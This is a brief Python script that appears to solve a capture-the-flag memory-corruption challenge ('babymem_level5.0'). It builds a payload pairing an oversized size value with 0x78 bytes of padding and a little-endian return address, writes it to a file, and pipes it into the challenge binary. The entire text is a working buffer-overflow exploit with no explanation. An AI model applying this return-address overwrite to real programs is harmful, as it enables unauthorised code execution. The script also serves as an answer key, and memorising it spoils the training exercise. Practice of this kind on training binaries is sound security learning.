import os
s=b"2147483648\n2\n"+b"A"*0x78+0x401C76.to_bytes(8,"little")
print(s)
fd = open("ttt-raw","wb+")
fd.write(s)
fd.close()
os.system("cat ttt-raw | /challenge/babymem_level5.0")